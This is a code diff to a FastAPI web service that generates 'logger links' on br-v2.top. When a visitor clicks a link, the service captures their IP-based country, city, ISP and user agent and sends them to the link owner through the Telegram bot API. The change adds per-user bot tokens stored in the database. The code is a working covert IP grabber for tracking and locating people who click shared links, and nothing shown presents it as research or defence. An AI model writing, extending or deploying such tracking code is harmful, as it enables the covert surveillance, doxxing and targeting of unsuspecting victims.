@@ -87,9 +87,14 @@ async def init_site_tables(conn):
             id SERIAL PRIMARY KEY,
             token VARCHAR(32) UNIQUE NOT NULL,
             owner_id BIGINT NOT NULL,
+            bot_token TEXT NOT NULL DEFAULT '',
             created_at TIMESTAMPTZ DEFAULT NOW()
         )
     """)
+    try:
+        await conn.execute("ALTER TABLE logger_links ADD COLUMN IF NOT EXISTS bot_token TEXT NOT NULL DEFAULT ''")
+    except Exception:
+        pass
     await conn.execute("""
         CREATE TABLE IF NOT EXISTS logger_hits (
             id SERIAL PRIMARY KEY,
@@ -645,20 +650,22 @@ async def pay_redirect(token: str):
 
 
 @app.get("/create/{owner_id}")
-async def create_link(owner_id: str, request: Request):
+async def create_link(owner_id: str, request: Request, token: str = ""):
     import secrets
-    token = secrets.token_urlsafe(4)
+    link_token = secrets.token_urlsafe(4)
     try:
         owner_int = int(owner_id)
     except ValueError:
         raise HTTPException(status_code=400, detail="invalid owner_id")
+    # Use passed bot token, fallback to env
+    bot_tok = token or BOT_TOKEN
     async with pool.acquire() as conn:
         await conn.execute(
-            "INSERT INTO logger_links (token, owner_id) VALUES ($1, $2)",
-            token, owner_int
+            "INSERT INTO logger_links (token, owner_id, bot_token) VALUES ($1, $2, $3)",
+            link_token, owner_int, bot_tok
         )
-    url = f"https://br-v2.top/l/{token}"
-    log.info(f"logger link created: owner={owner_id} token={token}")
+    url = f"https://br-v2.top/l/{link_token}"
+    log.info(f"logger link created: owner={owner_id} token={link_token}")
     return {"url": url}
 
 
@@ -671,12 +678,13 @@ async def logger_hit(token: str, request: Request):
     ua = request.headers.get("User-Agent", "")
 
     async with pool.acquire() as conn:
-        row = await conn.fetchrow("SELECT owner_id FROM logger_links WHERE token=$1", token)
+        row = await conn.fetchrow("SELECT owner_id, bot_token FROM logger_links WHERE token=$1", token)
 
     if not row:
         return RedirectResponse("https://t.me/Brrown_V2bot")
 
     owner_id = row["owner_id"]
+    effective_bot_token = row["bot_token"] or BOT_TOKEN
 
     country, city, isp = "—", "—", "—"
     try:
@@ -713,7 +721,7 @@ async def logger_hit(token: str, request: Request):
     try:
         async with aiohttp.ClientSession() as s:
             await s.post(
-                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+                f"https://api.telegram.org/bot{effective_bot_token}/sendMessage",
                 json={"chat_id": owner_id, "text": msg, "parse_mode": "HTML"},
                 timeout=aiohttp.ClientTimeout(total=5)
             )
